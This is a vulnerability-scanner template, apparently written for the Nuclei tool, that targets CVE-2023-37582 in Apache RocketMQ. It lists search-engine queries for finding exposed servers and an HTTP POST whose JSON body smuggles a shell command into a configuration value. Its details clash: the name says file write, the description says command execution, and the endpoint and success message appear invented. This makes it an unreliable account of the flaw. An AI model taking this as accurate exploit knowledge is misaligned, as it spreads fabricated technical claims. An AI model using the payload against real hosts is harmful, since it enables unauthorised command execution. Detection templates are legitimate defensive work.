id: CVE-2023-37582

info:
  name: Apache RocketMQ Arbitrary File Write Vulnerability Exploit
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    The RocketMQ NameServer component has a remote command execution vulnerability due to improper permission checks. This allows attackers to execute arbitrary commands on the system where RocketMQ is running. It is recommended to upgrade to version 5.1.2 or above for RocketMQ 5.x or 4.9.7 or above for RocketMQ 4.x.
  impact: |
    Allows an attacker to write arbitrary files on the server.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://github.com/20142995/sectool
    - https://github.com/Malayke/CVE-2023-37582_EXPLOIT
    - https://github.com/Threekiii/Awesome-POC
    - https://github.com/Threekiii/CVE
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-37582
    cwe-id: CWE-94
    epss-score: 0.0137
    epss-percentile: 0.86821
    cpe: cpe:2.3:a:apache:rocketmq:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: rocketmq
    shodan-query:
      - http.title:"rocketmq"
      - http.title:"rocketmq-console-ng"
    fofa-query:
      - protocol="rocketmq"
      - title="rocketmq"
      - title="rocketmq-console-ng"
    google-query:
      - intitle:"rocketmq"
      - intitle:"rocketmq-console-ng"

http:
  - method: POST
    path:
      - "{{BaseURL}}/nameserver/updateConfig"

    headers:
      Content-Type: "application/json"

    body: |
      {
        "configItem": "writeFile",
        "configValue": "/tmp/pwned; echo 'pwned' > /tmp/pwned"
      }
    matchers:
      - type: word
        words:
          - "Configuration updated successfully"
        part: body
